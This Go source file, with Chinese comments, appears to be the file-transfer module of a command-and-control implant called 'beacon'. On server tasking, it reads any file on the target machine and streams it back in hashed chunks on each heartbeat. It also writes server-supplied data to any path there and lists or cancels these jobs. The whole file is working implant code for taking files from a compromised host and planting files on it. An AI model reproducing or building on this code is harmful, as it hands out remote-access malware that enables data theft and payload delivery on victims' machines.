package command

import (
	"beacon/pkg/jobs"
	"beacon/pkg/utils/packet"
	"crypto/sha256"
	"encoding/hex"
	"errors"
	"io"
	"os"
	"sort"
	"sync"
	"time"
)

// 传输参数常量
const (
	transferMinChunkSize       = 4 * 1024      // 最小分块大小（4KB）
	transferDefaultChunkSize   = 512 * 1024    // 默认分块大小（512KB）
	transferMaxChunkSize       = 1024 * 1024   // 最大分块大小（1MB）
	transferDefaultChunksPerHB = 3             // 每心跳默认传输块数
	transferMaxChunksPerHB     = 16            // 每心跳最大传输块数
	transferMaxTotalChunks     = 1048576       // 单文件最大分块数（~1TB@1MB）
	transferMaxPollPlans       = 16            // 每次心跳最多处理的下载计划数
)

// DownloadRequest 描述服务端发起的文件下载请求。
type DownloadRequest struct {
	TaskID             string // 传输任务的唯一 ID
	RemotePath         string // 目标机器上的文件路径
	ChunkSize          int    // 每块大小（字节）
	ChunksPerHeartbeat int    // 每心跳传输的块数
}

// FileChunk 描述一个文件分块，用于下载和上传。
type FileChunk struct {
	TaskID      string // 所属传输任务 ID
	FileID      string // 文件 SHA-256 校验和
	ChunkIndex  int    // 当前块索引（从 0 开始）
	TotalChunks int    // 文件总块数
	Data        []byte // 块数据
}

// DownloadState 跟踪一个活跃的文件下载任务的状态。
type DownloadState struct {
	OriginalTaskID     uint32    // 原始任务 ID（用于响应包组包）
	TaskID             string    // 传输任务 ID
	RemotePath         string    // 源文件路径
	FileID             string    // 文件 SHA-256
	ChunkSize          int       // 每块大小
	NextChunkIndex     int       // 下一块待读索引
	TotalChunks        int       // 总块数
	ChunksPerHeartbeat int       // 每心跳传输块数
	StartedAt          time.Time // 开始时间
}

// downloadReadPlan 是一次心跳内要读取的文件块范围。
type downloadReadPlan struct {
	OriginalTaskID uint32
	TaskID         string
	RemotePath     string
	FileID         string
	ChunkSize      int
	TotalChunks    int
	FirstChunk     int // 本次起始块索引
	ChunkCount     int // 本次读取块数
}

// UploadChunk 描述服务端发来的一个上传分块。
type UploadChunk struct {
	RemotePath string   // 目标写入路径
	Chunk      FileChunk // 分块数据
}

// UploadAck 是上传分块的确认回包。
type UploadAck struct {
	TransferTaskID string // 传输任务 ID
	FileID         string // 文件 SHA-256
	ChunkIndex     int    // 已确认的块索引
	WrittenBytes   int    // 实际写入字节数
	OK             bool   // 是否成功
	ErrorMessage   string // 错误信息（失败时）
}

// UploadState 跟踪一个活跃的文件上传任务的状态。
type UploadState struct {
	OriginalTaskID uint32    // 原始任务 ID
	RemotePath     string    // 目标文件路径
	FileID         string    // 文件 SHA-256
	ChunkSize      int       // 每块大小
	TotalChunks    int       // 总块数
	ReceivedChunks int       // 已接收块数
	ReceivedMap    []bool    // 各块是否已接收（用于去重）
	StartedAt      time.Time // 开始时间
}

var (
	uploadStates   = make(map[string]*UploadState)
	uploadMu       sync.Mutex
	downloadStates = make(map[string]*DownloadState)
	downloadMu     sync.Mutex
)

// Download 处理文件下载请求：解析参数 → 创建/获取下载状态 → 构建读取计划 → 读取文件块 → 返回结果包。
func Download(p *packet.Parser, originalTaskID uint32, acp int) ([][]byte, error) {
	req, err := parseDownloadRequest(p)
	if err != nil {
		return downloadErrorPacket(originalTaskID, err.Error()), nil
	}

	state, err := getOrCreateDownloadState(req, originalTaskID)
	if err != nil {
		return downloadErrorPacket(originalTaskID, err.Error()), nil
	}

	plan, ok := buildDownloadReadPlan(state.TaskID)
	if !ok {
		return nil, nil
	}

	results, chunksDone, fatal := readDownloadPlan(plan)
	commitDownloadReadPlan(plan, chunksDone, fatal)
	return results, nil
}

// GetPendingDownloadPackets 轮询所有活跃的下载任务，读取并返回下一批文件块。
func GetPendingDownloadPackets() [][]byte {
	plans := make([]downloadReadPlan, 0, transferMaxPollPlans)

	downloadMu.Lock()
	ids := make([]string, 0, len(downloadStates))
	for id := range downloadStates {
		ids = append(ids, id)
	}
	sort.Strings(ids)
	for _, id := range ids {
		if len(plans) >= transferMaxPollPlans {
			break
		}
		if plan, ok := buildDownloadReadPlanLocked(id); ok {
			plans = append(plans, plan)
		}
	}
	downloadMu.Unlock()

	var all [][]byte
	for _, plan := range plans {
		results, chunksDone, fatal := readDownloadPlan(plan)
		commitDownloadReadPlan(plan, chunksDone, fatal)
		all = append(all, results...)
	}
	return all
}

// Upload 处理文件上传分块：解析参数 → 验证 → 写入文件 → 返回确认包。
func Upload(p *packet.Parser, originalTaskID uint32, acp int) ([]byte, error) {
	uploadChunk, err := parseUploadChunk(p)
	if err != nil {
		taskID := uploadChunk.Chunk.TaskID
		fileID := uploadChunk.Chunk.FileID
		ackPayload, _ := packUploadAck(UploadAck{
			TransferTaskID: taskID,
			FileID:         fileID,
			ChunkIndex:     uploadChunk.Chunk.ChunkIndex,
			OK:             false,
			ErrorMessage:   err.Error(),
		})
		return ackPayload, nil
	}

	written, err := writeUploadChunk(uploadChunk, originalTaskID)
	ack := UploadAck{
		TransferTaskID: uploadChunk.Chunk.TaskID,
		FileID:         uploadChunk.Chunk.FileID,
		ChunkIndex:     uploadChunk.Chunk.ChunkIndex,
		WrittenBytes:   written,
		OK:             err == nil,
	}
	if err != nil {
		ack.ErrorMessage = err.Error()
	}

	ackPayload, _ := packUploadAck(ack)
	return ackPayload, nil
}

func parseDownloadRequest(p *packet.Parser) (DownloadRequest, error) {
	req := DownloadRequest{
		TaskID:             p.ParseString(),
		RemotePath:         p.ParseString(),
		ChunkSize:          int(p.ParseInt32()),
		ChunksPerHeartbeat: int(p.ParseInt32()),
	}
	if p.HasError() {
		return req, p.Error()
	}
	if req.TaskID == "" {
		return req, errors.New("missing transfer task id")
	}
	if req.RemotePath == "" {
		return req, errors.New("missing remote path")
	}

	req.ChunkSize = clampChunkSize(req.ChunkSize)
	req.ChunksPerHeartbeat = clampChunksPerHeartbeat(req.ChunksPerHeartbeat)
	return req, nil
}

func getOrCreateDownloadState(req DownloadRequest, originalTaskID uint32) (*DownloadState, error) {
	downloadMu.Lock()
	state := downloadStates[req.TaskID]
	downloadMu.Unlock()
	if state != nil {
		return state, nil
	}

	fileID, size, err := sha256File(req.RemotePath)
	if err != nil {
		return nil, err
	}
	totalChunks64 := int64(1)
	if size > 0 {
		totalChunks64 = (size + int64(req.ChunkSize) - 1) / int64(req.ChunkSize)
	}
	if totalChunks64 > transferMaxTotalChunks {
		return nil, errors.New("download has too many chunks")
	}

	downloadMu.Lock()
	defer downloadMu.Unlock()
	if state = downloadStates[req.TaskID]; state != nil {
		return state, nil
	}

	state = &DownloadState{
		OriginalTaskID:     originalTaskID,
		TaskID:             req.TaskID,
		RemotePath:         req.RemotePath,
		FileID:             fileID,
		ChunkSize:          req.ChunkSize,
		TotalChunks:        int(totalChunks64),
		ChunksPerHeartbeat: req.ChunksPerHeartbeat,
		StartedAt:          time.Now(),
	}
	downloadStates[req.TaskID] = state
	return state, nil
}

func buildDownloadReadPlan(taskID string) (downloadReadPlan, bool) {
	downloadMu.Lock()
	defer downloadMu.Unlock()
	return buildDownloadReadPlanLocked(taskID)
}

func buildDownloadReadPlanLocked(taskID string) (downloadReadPlan, bool) {
	state := downloadStates[taskID]
	if state == nil {
		return downloadReadPlan{}, false
	}
	if state.NextChunkIndex >= state.TotalChunks {
		delete(downloadStates, taskID)
		return downloadReadPlan{}, false
	}

	remaining := state.TotalChunks - state.NextChunkIndex
	chunkCount := remaining
	if chunkCount > state.ChunksPerHeartbeat {
		chunkCount = state.ChunksPerHeartbeat
	}
	if chunkCount <= 0 {
		return downloadReadPlan{}, false
	}

	return downloadReadPlan{
		OriginalTaskID: state.OriginalTaskID,
		TaskID:         state.TaskID,
		RemotePath:     state.RemotePath,
		FileID:         state.FileID,
		ChunkSize:      state.ChunkSize,
		TotalChunks:    state.TotalChunks,
		FirstChunk:     state.NextChunkIndex,
		ChunkCount:     chunkCount,
	}, true
}

func readDownloadPlan(plan downloadReadPlan) ([][]byte, int, bool) {
	file, err := os.Open(plan.RemotePath)
	if err != nil {
		return downloadErrorPacket(plan.OriginalTaskID, "open download file failed"), 0, true
	}
	defer file.Close()

	results := make([][]byte, 0, plan.ChunkCount)
	buf := make([]byte, plan.ChunkSize)
	chunksDone := 0

	for i := 0; i < plan.ChunkCount; i++ {
		idx := plan.FirstChunk + i
		offset := int64(idx * plan.ChunkSize)
		n, err := file.ReadAt(buf, offset)
		if err != nil && err != io.EOF {
			return append(results, downloadErrorPacket(plan.OriginalTaskID, "read download file failed")...), chunksDone, true
		}

		data := make([]byte, n)
		copy(data, buf[:n])
		payload, _ := packFileChunk(FileChunk{
			TaskID:      plan.TaskID,
			FileID:      plan.FileID,
			ChunkIndex:  idx,
			TotalChunks: plan.TotalChunks,
			Data:        data,
		})
		results = append(results, packet.MakeFinalPacket(plan.OriginalTaskID, CommandDownload, payload))
		chunksDone++
	}

	return results, chunksDone, false
}

func commitDownloadReadPlan(plan downloadReadPlan, chunksDone int, fatal bool) {
	downloadMu.Lock()
	defer downloadMu.Unlock()

	state := downloadStates[plan.TaskID]
	if state == nil {
		return
	}
	if fatal {
		delete(downloadStates, plan.TaskID)
		return
	}
	if chunksDone <= 0 || state.NextChunkIndex != plan.FirstChunk {
		return
	}
	state.NextChunkIndex += chunksDone
	if state.NextChunkIndex >= state.TotalChunks {
		delete(downloadStates, plan.TaskID)
	}
}

func downloadErrorPacket(originalTaskID uint32, msg string) [][]byte {
	return [][]byte{packet.MakeFinalPacket(originalTaskID, CommandDownload, []byte(msg))}
}

func packFileChunk(chunk FileChunk) ([]byte, error) {
	return packet.PackArray([]any{
		chunk.TaskID,
		chunk.FileID,
		int32(chunk.ChunkIndex),
		int32(chunk.TotalChunks),
		packet.PackBytes(chunk.Data),
	})
}

func parseUploadChunk(p *packet.Parser) (UploadChunk, error) {
	remotePath := p.ParseString()
	taskID := p.ParseString()
	fileID := p.ParseString()
	chunkIndex := int(p.ParseInt32())
	totalChunks := int(p.ParseInt32())
	data := p.ParseBytes()

	chunk := UploadChunk{
		RemotePath: remotePath,
		Chunk: FileChunk{
			TaskID:      taskID,
			FileID:      fileID,
			ChunkIndex:  chunkIndex,
			TotalChunks: totalChunks,
			Data:        data,
		},
	}
	if p.HasError() {
		return chunk, p.Error()
	}
	if chunk.RemotePath == "" {
		return chunk, errors.New("missing remote path")
	}
	if chunk.Chunk.TaskID == "" {
		return chunk, errors.New("missing transfer task id")
	}
	if chunk.Chunk.FileID == "" {
		return chunk, errors.New("missing file id")
	}
	if chunk.Chunk.ChunkIndex < 0 || chunk.Chunk.TotalChunks <= 0 || chunk.Chunk.ChunkIndex >= chunk.Chunk.TotalChunks {
		return chunk, errors.New("invalid upload chunk index")
	}
	if chunk.Chunk.TotalChunks > transferMaxTotalChunks {
		return chunk, errors.New("upload has too many chunks")
	}
	if len(chunk.Chunk.Data) > transferMaxChunkSize {
		return chunk, errors.New("upload chunk too large")
	}
	return chunk, nil
}

func writeUploadChunk(chunk UploadChunk, originalTaskID uint32) (int, error) {
	state, chunkSize, alreadyReceived, err := prepareUploadChunk(chunk, originalTaskID)
	if err != nil {
		return 0, err
	}
	if alreadyReceived {
		return len(chunk.Chunk.Data), nil
	}

	offset := int64(chunk.Chunk.ChunkIndex) * int64(chunkSize)
	file, err := os.OpenFile(chunk.RemotePath, os.O_CREATE|os.O_RDWR, 0644)
	if err != nil {
		return 0, err
	}
	defer file.Close()

	n, err := file.WriteAt(chunk.Chunk.Data, offset)
	if err != nil {
		return n, err
	}
	if n != len(chunk.Chunk.Data) {
		return n, errors.New("write upload chunk failed")
	}

	commitUploadChunk(chunk.Chunk.TaskID, chunk.Chunk.ChunkIndex, state)
	return n, nil
}

func prepareUploadChunk(chunk UploadChunk, originalTaskID uint32) (*UploadState, int, bool, error) {
	uploadMu.Lock()
	defer uploadMu.Unlock()

	state := uploadStates[chunk.Chunk.TaskID]
	if state == nil {
		if chunk.Chunk.ChunkIndex != 0 {
			return nil, 0, false, errors.New("missing initial chunk to determine chunk size")
		}
		if chunk.Chunk.TotalChunks > 1 && len(chunk.Chunk.Data) == 0 {
			return nil, 0, false, errors.New("invalid initial chunk size")
		}
		state = &UploadState{
			RemotePath:     chunk.RemotePath,
			FileID:         chunk.Chunk.FileID,
			ChunkSize:      len(chunk.Chunk.Data),
			TotalChunks:    chunk.Chunk.TotalChunks,
			ReceivedMap:    make([]bool, chunk.Chunk.TotalChunks),
			OriginalTaskID: originalTaskID,
			StartedAt:      time.Now(),
		}
		uploadStates[chunk.Chunk.TaskID] = state
	}

	if state.FileID != chunk.Chunk.FileID || state.TotalChunks != chunk.Chunk.TotalChunks {
		return nil, 0, false, errors.New("upload transfer metadata mismatch")
	}
	if chunk.Chunk.ChunkIndex == 0 {
		if state.ChunkSize != len(chunk.Chunk.Data) {
			return nil, 0, false, errors.New("upload chunk size mismatch")
		}
	} else if state.ChunkSize == 0 {
		return nil, 0, false, errors.New("missing initial chunk to determine chunk size")
	} else if chunk.Chunk.ChunkIndex+1 < chunk.Chunk.TotalChunks && state.ChunkSize != len(chunk.Chunk.Data) {
		return nil, 0, false, errors.New("upload chunk size mismatch")
	}

	return state, state.ChunkSize, state.ReceivedMap[chunk.Chunk.ChunkIndex], nil
}

func commitUploadChunk(taskID string, chunkIndex int, expected *UploadState) {
	uploadMu.Lock()
	defer uploadMu.Unlock()

	state := uploadStates[taskID]
	if state == nil || state != expected || state.ReceivedMap[chunkIndex] {
		return
	}

	state.ReceivedMap[chunkIndex] = true
	state.ReceivedChunks++
	if state.ReceivedChunks >= state.TotalChunks {
		delete(uploadStates, taskID)
	}
}

func packUploadAck(ack UploadAck) ([]byte, error) {
	return packet.PackArray([]any{
		ack.TransferTaskID,
		ack.FileID,
		int32(ack.ChunkIndex),
		int32(ack.WrittenBytes),
		ack.OK,
		ack.ErrorMessage,
	})
}

func sha256File(path string) (string, int64, error) {
	f, err := os.Open(path)
	if err != nil {
		return "", 0, err
	}
	defer f.Close()

	stat, err := f.Stat()
	if err != nil {
		return "", 0, err
	}

	h := sha256.New()
	if _, err := io.Copy(h, f); err != nil {
		return "", 0, err
	}
	return hex.EncodeToString(h.Sum(nil)), stat.Size(), nil
}

func clampChunkSize(value int) int {
	if value <= 0 {
		return transferDefaultChunkSize
	}
	if value < transferMinChunkSize {
		return transferMinChunkSize
	}
	if value > transferMaxChunkSize {
		return transferMaxChunkSize
	}
	return value
}

func clampChunksPerHeartbeat(value int) int {
	if value <= 0 {
		return transferDefaultChunksPerHB
	}
	if value > transferMaxChunksPerHB {
		return transferMaxChunksPerHB
	}
	return value
}

// TransferJobRows 返回所有活跃传输任务的 Job 行信息（用于 jobs 命令展示）。
func TransferJobRows() []jobs.Row {
	now := time.Now()
	rows := make([]jobs.Row, 0)

	downloadMu.Lock()
	for _, state := range downloadStates {
		rows = append(rows, jobs.Row{
			ID:        state.OriginalTaskID,
			Type:      "download",
			State:     "running",
			Age:       int64(now.Sub(state.StartedAt).Seconds()),
			CommandID: CommandDownload,
			Name:      "download",
			Ref:       state.TaskID,
			Detail:    state.RemotePath,
		})
	}
	downloadMu.Unlock()

	uploadMu.Lock()
	for taskID, state := range uploadStates {
		rows = append(rows, jobs.Row{
			ID:        state.OriginalTaskID,
			Type:      "upload",
			State:     "running",
			Age:       int64(now.Sub(state.StartedAt).Seconds()),
			CommandID: CommandUpload,
			Name:      "upload",
			Ref:       taskID,
			Detail:    state.RemotePath,
		})
	}
	uploadMu.Unlock()

	sort.Slice(rows, func(i, j int) bool { return rows[i].ID < rows[j].ID })
	return rows
}

// CancelTransferJob 根据 Job ID 取消一个活跃的传输任务（下载或上传）。
func CancelTransferJob(jobID uint32) (string, bool) {
	downloadMu.Lock()
	for taskID, state := range downloadStates {
		if state.OriginalTaskID == jobID {
			delete(downloadStates, taskID)
			downloadMu.Unlock()
			return "download job canceled", true
		}
	}
	downloadMu.Unlock()

	uploadMu.Lock()
	for taskID, state := range uploadStates {
		if state.OriginalTaskID == jobID {
			delete(uploadStates, taskID)
			uploadMu.Unlock()
			return "upload job canceled", true
		}
	}
	uploadMu.Unlock()

	return "", false
}
